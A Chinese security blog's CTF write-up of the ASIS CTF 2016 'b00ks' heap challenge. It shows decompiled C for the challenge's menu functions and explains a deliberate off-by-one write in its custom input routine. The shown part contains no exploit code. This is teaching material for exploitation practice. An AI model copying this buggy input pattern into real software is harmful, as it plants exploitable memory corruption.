@@ -1,0 +1,427 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!--Description-->
+    
+        <meta name="description" content="专注于网络安全、CTF竞赛、技术研究的个人博客">
+    
+
+    <!--Author-->
+    
+        <meta name="author" content="N0P3">
+    
+
+    <!--Open Graph Title-->
+    
+        <meta property="og:title" content="Asis_ctf_2016_b00ks"/>
+    
+
+    <!--Open Graph Description-->
+    
+        <meta property="og:description" content="专注于网络安全、CTF竞赛、技术研究的个人博客" />
+    
+
+    <!--Open Graph Site Name-->
+    <meta property="og:site_name" content="N0P3&#39;s Blog"/>
+
+    <!--Type page-->
+    
+        <meta property="og:type" content="article" />
+    
+
+    <!--Page Cover-->
+    
+
+    
+        <meta name="twitter:card" content="summary" />
+    
+    
+    
+
+    <!-- Title -->
+    
+    <title>Asis_ctf_2016_b00ks - N0P3&#39;s Blog</title>
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">
+
+    <!-- Custom Fonts -->
+    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- Gallery -->
+    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />
+
+    <!-- Custom CSS -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    <!-- Google Analytics -->
+    
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+
+<div class="bg-gradient"></div>
+<div class="bg-pattern"></div>
+
+<!-- Menu -->
+<!--Menu Links and Overlay-->
+<div class="menu-bg">
+    <div class="menu-container">
+        <ul>
+            
+            <li class="menu-item">
+                <a href="/">
+                    Home
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/archives">
+                    Archives
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/about.html">
+                    About
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/tags">
+                    Tags
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/categories">
+                    Categories
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/contact.html">
+                    Contact
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+</div>
+
+<!--Hamburger Icon-->
+<nav>
+    <a href="#menu"></a>
+</nav>
+
+<div class="container">
+
+    <!-- Main Content -->
+    <div class="row">
+    <div class="col-sm-12">
+
+        <!--Title and Logo-->
+        <header>
+    <div class="logo">
+        <a href="/"><i class="logo-icon fa fa-cube" aria-hidden="true"></i></a>
+        
+    </div>
+</header>
+
+        <section class="main">
+            
+<div class="post">
+
+    <div class="post-header">
+        <h1 class="title">
+            <a href="/2020/10/18/Off-by-one/">
+                Asis_ctf_2016_b00ks
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2020-10-18</span>
+            
+            
+            
+        </div>
+    </div>
+
+    <div class="content">
+
+        <!-- Gallery -->
+        
+
+        <!-- Post Content -->
+        <p><em>ctf wiki上看到的一道堆题,原题的环境是ubuntu16。本文是在ubuntu18上复现的。</em></p>
+<h1 id="ASIS-CTF-2016-b00ks"><a href="#ASIS-CTF-2016-b00ks" class="headerlink" title="ASIS CTF 2016 b00ks"></a>ASIS CTF 2016 b00ks</h1><p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/OffbyOne/%E6%88%AA%E5%B1%8F2020-10-18%20%E4%B8%8B%E5%8D%888.46.16.png" alt="截屏2020-10-18 下午8.46.16"></p>
+<p>除了canary以外保护全开</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/OffbyOne/%E6%88%AA%E5%B1%8F2020-10-18%20%E4%B8%8B%E5%8D%888.48.24.png" alt="截屏2020-10-18 下午8.48.24"></p>
+<p>执行一下发现是个菜单类应用</p>
+<p>具体执行内容到ida看一下</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 savedregs; <span class="comment">// [rsp+20h] [rbp+0h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">setvbuf</span>(stdout, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stdin, <span class="number">0LL</span>, <span class="number">1</span>, <span class="number">0LL</span>);                  <span class="comment">// </span></span><br><span class="line">                                                <span class="comment">// BooksHeap+i：id</span></span><br><span class="line">  <span class="built_in">Welcome</span>();</span><br><span class="line">  <span class="built_in">EnterAuthName</span>();</span><br><span class="line">  <span class="keyword">while</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">MainMenu</span>() != <span class="number">6</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)&amp;savedregs )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1u</span>:</span><br><span class="line">        <span class="built_in">CreateBook</span>();                           <span class="comment">// Off by one</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2u</span>:</span><br><span class="line">        <span class="built_in">Deletebook</span>();                           <span class="comment">// 没用从+6开始free，从+8开始free</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3u</span>:</span><br><span class="line">        <span class="built_in">EditBook</span>();                             <span class="comment">// description位置与DeleteBook()一致</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4u</span>:</span><br><span class="line">        <span class="built_in">OutPutBooks</span>();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5u</span>:</span><br><span class="line">        <span class="built_in">EnterAuthName</span>();                        <span class="comment">// Off by one </span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Wrong option&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Thanks to use our library software&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>多数函数已经经过重命名，并注释了一些信息（没什么用）</p>
+<h2 id="函数分析"><a href="#函数分析" class="headerlink" title="函数分析"></a>函数分析</h2><h3 id="CreateBook"><a href="#CreateBook" class="headerlink" title="CreateBook()"></a>CreateBook()</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">signed</span> __int64 <span class="title">CreateBook</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> Size; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line">  <span class="type">int</span> NewBookId; <span class="comment">// [rsp+4h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">void</span> *NewBookHeap; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="type">void</span> *BookNameHeap; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="type">void</span> *DescriptionHeap; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  Size = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nEnter book name size: &quot;</span>, *(_QWORD *)&amp;Size);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;Size);</span><br><span class="line">  <span class="keyword">if</span> ( Size &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Enter book name (Max 32 chars): &quot;</span>, &amp;Size);</span><br><span class="line">    BookNameHeap = <span class="built_in">malloc</span>(Size);</span><br><span class="line">    <span class="keyword">if</span> ( BookNameHeap )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">input_BUG</span>(BookNameHeap, Size - <span class="number">1</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;fail to read name&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        Size = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\nEnter book description size: &quot;</span>, *(_QWORD *)&amp;Size);</span><br><span class="line">        __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;Size);</span><br><span class="line">        <span class="keyword">if</span> ( Size &gt;= <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          DescriptionHeap = <span class="built_in">malloc</span>(Size);</span><br><span class="line">          <span class="keyword">if</span> ( DescriptionHeap )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Enter book description: &quot;</span>, &amp;Size);</span><br><span class="line">            <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">input_BUG</span>(DescriptionHeap, Size - <span class="number">1</span>) )<span class="comment">// 没有多循环</span></span><br><span class="line">            &#123;</span><br><span class="line">              <span class="built_in">printf</span>(<span class="string">&quot;Unable to read description&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              NewBookId = <span class="built_in">AssignBookNumber</span>();</span><br><span class="line">              <span class="keyword">if</span> ( NewBookId == <span class="number">-1</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Library is full&quot;</span>);</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">              &#123;                                 <span class="comment">// 未满</span></span><br><span class="line">                NewBookHeap = <span class="built_in">malloc</span>(<span class="number">0x20uLL</span>);</span><br><span class="line">                <span class="keyword">if</span> ( NewBookHeap )</span><br><span class="line">                &#123;</span><br><span class="line">                  *((_DWORD *)NewBookHeap + <span class="number">6</span>) = Size;</span><br><span class="line">                  *((_QWORD *)BooksZone + NewBookId) = NewBookHeap;</span><br><span class="line">                  *((_QWORD *)NewBookHeap + <span class="number">2</span>) = DescriptionHeap;</span><br><span class="line">                  *((_QWORD *)NewBookHeap + <span class="number">1</span>) = BookNameHeap;</span><br><span class="line">                  *(_DWORD *)NewBookHeap = ++unk_202024;</span><br><span class="line">                  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Unable to allocate book struct&quot;</span>);</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Fail to allocate memory&quot;</span>, &amp;Size);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;Malformed size&quot;</span>, &amp;Size);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;unable to allocate enough space&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Malformed size&quot;</span>, &amp;Size);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( BookNameHeap )</span><br><span class="line">    <span class="built_in">free</span>(BookNameHeap);</span><br><span class="line">  <span class="keyword">if</span> ( DescriptionHeap )</span><br><span class="line">    <span class="built_in">free</span>(DescriptionHeap);</span><br><span class="line">  <span class="keyword">if</span> ( NewBookHeap )</span><br><span class="line">    <span class="built_in">free</span>(NewBookHeap);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>执行函数是会先让用户输入书名的大小，然后再输入书名。书本描述也是先输入描述大小再输入描述。两次字符串输入都是通过一个开发者自定的输入函数实现的。</p>
+<h4 id="input-BUG"><a href="#input-BUG" class="headerlink" title="input_BUG()"></a>input_BUG()</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">signed</span> __int64 __fastcall <span class="title">input_BUG</span><span class="params">(_BYTE *a1, <span class="type">int</span> _32)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  _BYTE *_addr; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( _32 &lt;= <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  _addr = a1;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">read</span>(<span class="number">0</span>, _addr, <span class="number">1uLL</span>) != <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *_addr == <span class="string">&#x27;\n&#x27;</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ++_addr;</span><br><span class="line">    <span class="keyword">if</span> ( i == _32 )                             <span class="comment">// 等于a2就跳出</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *_addr = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个开发者自定义的输入函数被我标记了BUG，是因为它在line 16处确实存在一个漏洞，在line 9可以看到计数器i从0开始，当等于32时结束。但这个if判断在循环体下方执行，也就是说判断到i&#x3D;&#x3D;32时其实又执行了一次循环体，实际上我们这个循环执行了33次。我们可以比开发者设想的多写入一个字节，也就是Off by one。（当然有可能开发者本就想让用户输入33个字节，稍后我们会知道我们确实超出了开发者预期）</p>
+<h4 id="AssignBookNumber"><a href="#AssignBookNumber" class="headerlink" title="AssignBookNumber()"></a>AssignBookNumber()</h4><p>在CreateBook()函数的line 39处有一个AssignBookNumber()</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">signed</span> __int64 <span class="title">AssignBookNumber</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> i; <span class="comment">// [rsp+0h] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">19</span>; ++i )                   <span class="comment">// 实际执行20次，最多存20本书</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !*((_QWORD *)BooksZone + i) )          <span class="comment">// 似乎可以访问到off_202018的数据</span></span><br><span class="line">      <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)i;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0xFFFFFFFFLL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个函数很简单作用是分配书本id。</p>
+<h3 id="DeleteBook"><a href="#DeleteBook" class="headerlink" title="DeleteBook()"></a>DeleteBook()</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">signed</span> __int64 <span class="title">Deletebook</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  i = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter the book id you want to delete: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">19</span> &amp;&amp; (!*((_QWORD *)BooksZone + i) || **((_DWORD **)BooksZone + i) != v1); ++i )</span><br><span class="line">      ;</span><br><span class="line">    <span class="keyword">if</span> ( i != <span class="number">20</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span>(*(<span class="type">void</span> **)(*((_QWORD *)BooksZone + i) + <span class="number">8LL</span>));</span><br><span class="line">      <span class="built_in">free</span>(*(<span class="type">void</span> **)(*((_QWORD *)BooksZone + i) + <span class="number">16LL</span>));</span><br><span class="line">      <span class="built_in">free</span>(*((<span class="type">void</span> **)BooksZone + i));</span><br><span class="line">      *((_QWORD *)BooksZone + i) = <span class="number">0LL</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Can&#x27;t find selected book!&quot;</span>, &amp;v1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Wrong id&quot;</span>, &amp;v1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>用户输入书本id，free掉对应书本的结构体。（书本的结构体分析稍后研究）</p>
+<h3 id="EditBook"><a href="#EditBook" class="headerlink" title="EditBook()"></a>EditBook()</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">signed</span> __int64 <span class="title">EditBook</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter the book id you want to edit: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">19</span> &amp;&amp; (!*((_QWORD *)BooksZone + i) || **((_DWORD **)BooksZone + i) != v1); ++i )</span><br><span class="line">      ;</span><br><span class="line">    <span class="keyword">if</span> ( i == <span class="number">20</span> )                              <span class="comment">// id过大</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Can&#x27;t find selected book!&quot;</span>, &amp;v1);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Enter new book description: &quot;</span>, &amp;v1);</span><br><span class="line">      <span class="keyword">if</span> ( !(<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">input_BUG</span>(</span><br><span class="line">                            *(_BYTE **)(*((_QWORD *)BooksZone + i) + <span class="number">16LL</span>),</span><br><span class="line">                            *(_DWORD *)(*((_QWORD *)BooksZone + i) + <span class="number">24LL</span>) - <span class="number">1</span>) )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Unable to read new description&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Wrong id&quot;</span>, &amp;v1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>输入书本id，通过input_BUG输入新的描述。</p>
+<h3 id="OutPutBooks"><a href="#OutPutBooks" class="headerlink" title="OutPutBooks()"></a>OutPutBooks()</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">OutPutBooks</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">19</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = *((_QWORD *)BooksZone + i);</span><br><span class="line">    <span class="keyword">if</span> ( v0 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;ID: %d\n&quot;</span>, **((<span class="type">unsigned</span> <span class="type">int</span> **)BooksZone + i));</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Name: %s\n&quot;</span>, *(_QWORD *)(*((_QWORD *)BooksZone + i) + <span class="number">8LL</span>));</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Description: %s\n&quot;</span>, *(_QWORD *)(*((_QWORD *)BooksZone + i) + <span class="number">16LL</span>));</span><br><span class="line">      <span class="built_in">LODWORD</span>(v0) = <span class="built_in">printf</span>(<span class="string">&quot;Author: %s\n&quot;</span>, AuthorName);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>执行后会打印出所有的书。</p>
